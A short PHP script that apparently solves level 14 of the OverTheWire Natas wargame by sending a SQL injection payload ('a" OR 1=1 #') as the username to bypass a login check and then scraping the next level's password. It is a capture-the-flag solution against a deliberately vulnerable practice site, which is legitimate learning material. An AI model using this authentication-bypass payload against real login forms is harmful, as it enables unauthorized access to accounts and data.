<?php
require_once dirname(__DIR__) . '/bootstrap.php';

$level = 14;
$username = 'natas' . $level;
$password = readFlag($level - 1);

$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$response = $client->request('POST', $url, [
    'auth' => [$username, $password],
    'form_params' => [
        'username' => 'a" OR 1=1 #', //SELECT * from users where username="a" OR 1=1 #" and password=""
        'password' => '',
    ],
    'query' => ['debug' => 'debug']
]);

$body = (string)$response->getBody();
preg_match("/The password for natas15 is (.*)<br>/", $body, $flag);
echo $flag[1];
